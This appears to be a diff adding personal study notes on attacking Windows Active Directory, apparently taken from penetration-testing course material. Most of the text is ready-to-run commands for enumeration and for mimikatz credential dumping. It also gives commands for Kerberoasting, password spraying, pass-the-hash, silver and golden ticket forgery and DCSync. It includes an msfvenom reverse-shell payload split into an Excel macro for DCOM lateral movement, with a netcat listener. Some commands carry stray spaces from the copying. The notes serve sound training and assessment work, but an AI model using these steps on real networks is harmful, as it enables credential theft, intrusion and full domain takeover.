@@ -1,0 +1,248 @@
+
+# Active Directory Enumeration 
+
+# Enumerating Users : 
+
+	- Traditional Approach 
+	commands : 
+		net user
+		net user /domain 
+		net user [username] /domain 
+		net group /domain 
+	- Modern Approach 
+	commands : Powershell Cmdlets 
+		Get-ADUser  	
+Note 1 : Lightweight Directory Access Protocol (LDAP),612 which is a network protocol understood by domain controllers also used for communication with third-party applications.
+Note 2 : LDAP is an Active Directory Service Interfaces (ADSI)613 provider (essentially an API) that supports search functionality against an Active Directory.
+	 This will allow us to interface with the domain controller using PowerShell and extract non-privileged information about the objects in the domain.
+		
+		[System.DirectoryServices.ActiveDirectory.Domain]::GetCurrent Domain()
+		
+Note 3 : For Enumeration of Users in an AD use the EnumeratingAD.ps1 
+
+# Resolving Nested Groups : 
+	First We will Find all the group that exist in an Domain  
+	Script : EnumerateGroupNames.ps1
+	
+	For Secret_group user use : EnumerateGroupNamesFilter.ps1
+
+# Currently Logged On User : 
+	since their credentials will be cached in memory and we could steal the credentials and authenticate with them.
+	The two most reliable Windows functions that can help us to achieve these goals are the NetWkstaUserEnum626 and NetSessionEnum627 API.
+	
+	Use the script powerview.ps1
+	Import-Module .\PowerView.ps1
+	Get-NetLoggedon -ComputerName client251
+	Get-NetSession -ComputerName dc01
+	
+# Enumeration Through Service Principal Name : 
+	 use the script : Detect Registered Service Principal Name 
+	 nslookup CorpWebServer.corp.com
+
+# Active Directory Authentication 
+	Active Directory uses either Kerberos640 or NTLM authentication641 protocols for most authentication attempts. We will discuss the simpler NTLM protocol.
+	
+# NTLM Authentication 
+	NTLM authentication is used when a client authenticates to a server by IP address (instead of by hostname),642 or if the user attempts to authenticate to a hostname that is not registered on the Active Directory integrated DNS server.
+	In the first authentication step, the computer calculates a cryptographic hash, called the NTLM hash, from the user’s password. Next, the client computer sends the user name to the server, which returns a random value called the nonce or challenge. The client then encrypts the nonce using the NTLM hash, now known as a response, and sends it to the server.
+	The server forwards the response along with the username and the nonce to the domain controller. The validation is then performed by the domain controller, since it already knows the NTLM hash of all users. The domain controller encrypts the challenge itself with the NTLM hash of the supplied username and compares it to the response it received from the server. If the two are equal, the authentication request is successful.
+
+# Kerberos Authentication
+	While NTLM authentication works through a principle of challenge and response, Windows-based Kerberos authentication uses a ticket system.
+	Kerberos client authentication to a service in Active Directory involves the use of a domain controller in the role of a key distribution center, or KDC
+	
+
+# Cached Credentials Storage and Retrieval : 
+	Local Security Authority Subsystem Service (LSASS)646 memory space. 
+	The process is not as straightforward as it sounds. Since the LSASS process is part of the operating system and runs as SYSTEM, we need SYSTEM (or local administrator) permissions to gain access to the hashes stored on a target.
+	To makes things even more tricky, the data structures used to store the hashes in memory are not publicly documented and they are also encrypted with an LSASS-stored key.
+	
+	Tool we use here is : mimikatz
+	C:\User\System32 mimikatz.exe
+	mimikatz # privilege::debug
+	mimikatz # sekurlsa::logonpasswords
+
+	we have two types of hashes
+	for Windows Server 2003 : it only uses NTLM hash
+	for Windows Server 2008 : it Uses NTLM as well as SHA-1
+
+	TGT Tickets are also stored in LSASS and we can use mimikatz to interact and retrieve our own tickets and tickets of the other local user 
+	
+	mimikatz # sekurlsa::tickets 
+	
+# Service Account Attacks : 
+	When requesting the service ticket from the domain controller, no checks are performed on whether the user has any permissions to access the service hosted by the service principal name.
+	From PowerShell, we can use the KerberosRequestorSecurityToken class to request the service ticket.	  	
+	Commands : 
+	Add-Type -AssemblyName System.IdentityModel
+	New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'H TTP/CorpWebServer.corp.com'
+	
+	we can also use the built-in klist command to display all the cached kerberos tickets for the current User 
+	C:\User\ klist : run in powershell 
+	
+	To download the service ticket with Mimikatz, we use the kerberos::list command,
+	use /export to download it on the disk 
+	To download the service ticket with Mimikatz, we use the kerberos::list /export command, 
+
+	The service ticket is encrypted using the SPN’s password hash. If we are able to request the ticket and decrypt it using brute force or guessing (in a technique known as Kerberoasting661)
+	
+	kali@kali:~$ sudo apt update && sudo apt install kerberoast
+	
+	kali@kali:~$ python /usr/share/kerberoast/tgsrepcrack.py wordlist.txt 1-40a50000-Offse c@HTTP~CorpWebServer.corp.com-CORP.COM.kirbi
+
+# Low and Slow Password Guessing 
+	
+	To get the Domain Account Policy : 
+	command in CMD : net accounts 
+
+	we can also make queries in the context of a different user by setting the DirectoryEntry instance. 
+	Use Script Authenticate_Using_DirectoryEntry
+	
+	we can also use the spray-password.ps1 
+	use -pass : for single password
+	use -Admin : for admin accounts
+ 	
+	C:\Tools\active_directory> .\Spray-Passwords.ps1 -Pass Qwerty09! -Admin
+
+# Active Directory Lateral Movement 
+
+- Pass The Hash : 
+	The Pass the Hash (PtH) technique allows an attacker to authenticate to a remote system or service using a user’s NTLM hash instead of the associated plaintext password. Note that this will not work for Kerberos authentication but only for server or service using NTLM authentication	
+	- PsExec from Microsoft 
+	- Pass-the-Hash Toolkit 
+	- Impacket 
+	
+	commands : 
+	Pass The Hash : 	pth-winexe -U [username]%[PADDING:NTLM HASH] //[IP_ADDRESS] cmd
+	OverPass the Hash :	
+	The essence of the overpass the hash technique is to turn the NTLM hash into a Kerberos ticket and avoid the use of NTLM authentication
+	
+	sekurlsa::pth /user:jeff_admin /domain:corp.com /ntlm:e2b475c11da2a0748290d 87aa966c327 /run:PowerShell.exe
+	 
+	To list the cached Kerberos tickets 
+	
+	klist 
+	
+	No Kerberos tickets have been cached, but this is expected since Jeff_Admin has not performed an interactive login. However, let’s generate a TGT by authenticating to a network share on the domain controller with net use:
+	net use \\dc01
+	klist
+	
+	We have now converted our NTLM hash into a Kerberos TGT, allowing us to use any tools that rely on Kerberos authentication (as opposed to NTLM) such as the official PsExec application from Microsoft
+	PsExec can run a command remotely but does not accept password hashes. Since we have generated Kerberos tickets and operate in the context of Jeff_Admin in the PowerShell session, we may reuse the TGT to obtain code execution on the domain controller.
+	
+	.\PsExec.exe \\dc01 cmd.exe
+
+- Pass the Ticket : 
+	if the service account is not a local administrator on any servers, we would not be able to perform lateral movement using vectors such as pass the hash or overpass the hash
+	with the service account password or its associated NTLM hash at hand, we can forge our own service ticket to access the target resource (in our example the IIS application) with any permissions we desire. This custom-created ticket is known as a silver ticket675 and if the service principal name is used on multiple servers, the silver ticket can be leveraged against them all.
+	To create the ticket, we first need the obtain the so-called Security Identifier or SID677 of the domain. A SID is an unique name for any object in Active Directory and has the following structure:
+	to get SID run whoami /user
+	Before running this, we will flush any existing Kerberos tickets with kerberos::purge and verify the purge with kerberos::list:
+	
+	mimikatz # kerberos::golden /user:offsec /domain:corp.com /sid:S-1-5-21-1602875587-278 7523311-2599479668 /target:CorpWebServer.corp.com /service:HTTP /rc4:E2B475C11DA2A0748 290D87AA966C327 /ptt
+	
+	The silver ticket command requires a username (/user), domain name (/domain), the domain SID (/sid), which is highlighted above, the fully qualified host name of the service (/target), the service type (/service:HTTP), and the password hash of the iis_service service account (/rc4).
+	Finally, the generated silver ticket is injected directly into memory with the /ppt flag
+
+	To create a silver ticket, we use the password hash and not the cleartext password. If a kerberoast session presented us with the cleartext password, we must hash it before using it to generate a silver ticket.
+
+- Difference Between Silver Ticket and Golden Ticket 
+	While a Golden ticket is a forged TGT valid for gaining access to any Kerberos service, the silver ticket is a forged TGS. This means the Silver Ticket scope is limited to whatever service is targeted on a specific server.
+
+
+- Distributed Component Object Model
+
+NOTE : There are two other well-known lateral movement techniques worth mentioning: abusing Windows Management Instrumentation680 and a technique known as PowerShell Remoting
+	
+NOTE : The Microsoft Component Object Model (COM) is a system for creating software components that interact with each other. While COM was created for either same-process or cross-process interaction, it was extended to Distributed Component Object Model (DCOM) for interaction between multiple computers over a network.
+
+NOTE : DCOM objects related to Microsoft Office allow lateral movement, both through the use of Outlook as well as PowerPoint	
+
+To begin, we must first discover the available methods or sub-objects for this DCOM object using PowerShell
+
+ $com = [activator]::CreateInstance([type]::GetTypeFromProgId("Excel.Application", "192 .168.1.110"))
+ $com | Get-Member 
+	
+we will focus on the Run method,691 which will allow us to execute a Visual Basic for Applications (VBA) macro remotely.
+
+we need to upgrade this attack to launch a reverse shell instead. Since we are using an Office document, we can simply reuse the Microsoft Word client side code execution technique
+
+1. Create a payload : msfvenom -p windows/shell_reverse_tcp LHOST=192.168.1.111 LPORT=4444 -f h ta-psh -o evil.hta
+2. we extract the line starting with “powershell.exe -nop -w hidden -e” followed by the Base64 encoded payload and use the simple Python script in Listing 720 to split the command into smaller chunks, bypassing the size limit on literal strings in Excel macros:
+ 
+Python Script To break into small pieces 
+
+str = "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4AdABQ....."
+n = 50
+for i in range(0, len(str), n):
+	print "Str = Str + " + '"' + str[i:i+n] + '"'
+ 
+
+Sub MyMacro()
+Dim Str As String
+	Str = Str + "powershell.exe -nop -w hidden -e aQBmACgAWwBJAG4Ad"
+	Str = Str + "ABQAHQAcgBdADoAOgBTAGkAegBlACAALQBlAHEAIAA0ACkAewA"
+	Str = Str + "EQAaQBhAGcAbgBvAHMAdABpAGMAcwAuAFAAcgBvAGMAZQBzAHM"
+	Str = Str +  "AXQA6ADoAUwB0AGEAcgB0ACgAJABzACkAOwA="
+Shell (Str)
+End Sub
+ 
+Set up a netcat listener so that DC will connect back to you 
+	
+nc.exe -lvnp 4444
+
+# Active Directory Persistence 
+
+- Golden Ticket : 
+	Going back to the explanation of Kerberos authentication, we recall that when a user submits a request for a TGT, the KDC encrypts the TGT with a secret key known only to the KDCs in the domain. This secret key is actually the password hash of a domain user account called krbtgt
+	we could create a TGT stating that a non-privileged user is actually a member of the Domain Admins group, and the domain controller will trust it since it is correctly encrypted.
+	the best advantage is that the krbtgt account password is not automatically changed.
+	
+	steps : 
+	first we need to extract the hash of the krbtgt account 
+	login as a DC via remoted desktop protocol 
+	
+	mimikatz # privilege::debug
+	mimikatz # lsadump::lsa /patch
+	
+NOTE : Creating the golden ticket and injecting it into memory does not require any administrative privileges, and can even be performed from a computer that is not joined to the domain. We’ll take the hash and continue the procedure from a compromised workstation.
+
+Before doing any thing delete the priviously generated any golden ticket 
+	run : mimikatz # kerberos::purge	
+
+This will generate a golden ticket : 
+	mimikatz # kerberos::golden /user:fakeuser /domain:corp.com /sid:S-1-5-21-1602875587-2 787523311-2599479668 /krbtgt:75b60230a2394a812000dbfad8415965 /ptt
+
+NOTE 1 : We’ll supply the domain SID (which we can gather with whoami /user) to the Mimikatz kerberos::golden699 command to create the golden ticket. This time we’ll use the /krbtgt option instead of /rc4 to indicate we are supplying the password hash. We will set the golden ticket’s username to fakeuser. This is allowed because the domain controller trusts anything correctly encrypted by the krbtgt password hash.
+
+NOTE 2 : Mimikatz provides two sets of default values when using the golden ticket option, namely the user ID and the groups ID. The user ID is set to 500 by default, which is the RID of the built-in administrator for the domain, while the values for the groups ID consist of the most privileged groups in Active Directory, including the Domain Admins group.
+
+we can launch a new command prompt with misc::cmd and again attempt lateral movement with PsExec.
+psexec.exe \\dc01 cmd.exe
+
+
+# Domain Controller Synchronization : 
+
+Another way to achieve persistence in an Active Directory infrastructure is to steal the password hashes for all administrative users in the domain.
+
+1 : we could move laterally to the domain controller and run Mimikatz to dump the password hash of every user
+2 : We could also steal a copy of the NTDS.dit database file,700 which is a copy of all Active Directory accounts stored on the hard drive, similar to the SAM database used for local accounts.
+
+Important : 
+	In production environments, domains typically have more than one domain controller to provide redundancy. The Directory Replication Service Remote Protocol701 uses replication702 to synchronize these redundant domain controllers. A domain controller may request an update for a specific object, like an account, with the IDL_DRSGetNCChanges703 API
+
+	the domain controller receiving a request for an update does not verify that the request came from a known domain controller, but only that the associated SID has appropriate privileges. If we attempt to issue a rogue update request to a domain controller from a user who is a member of the Domain Admins group, it will succeed.
+
+	mimikatz # lsadump::dcsync /user:Administrator
+
+	Using the technique above, we can request a replication update with a domain controller and obtain the password hashes of every account in Active Directory without ever logging in to the domain controller.
+
+
+
+
+
+
+
+
+
+		
